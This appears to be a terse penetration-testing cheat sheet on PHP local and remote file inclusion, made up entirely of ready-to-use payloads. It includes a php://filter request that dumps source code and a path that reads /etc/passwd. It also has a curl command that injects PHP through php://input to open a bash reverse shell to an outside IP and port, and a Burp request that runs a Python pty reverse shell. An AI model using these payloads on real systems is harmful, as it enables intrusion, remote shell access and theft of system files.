### LFI

see content of php file
```
http://IP/index.php?m=php://filter/convert.base64-encode/resource=index
```

### RFI
```
http://IP//classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00

curl -s --data "<?php system('bash -i >& /dev/tcp/172.16.237.245/4545 0>&1
') ?>" "http://10.10.10.10/index.php?ACS_path=php://input%00"

```


### php wrapper for burp
```
GET /file.php?page=php://input HTTP/1.1
<?php

$output = shell_exec('export RHOST="192......";export RPORT=8888;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'');

echo "<pre>$output</pre>";

?>
```
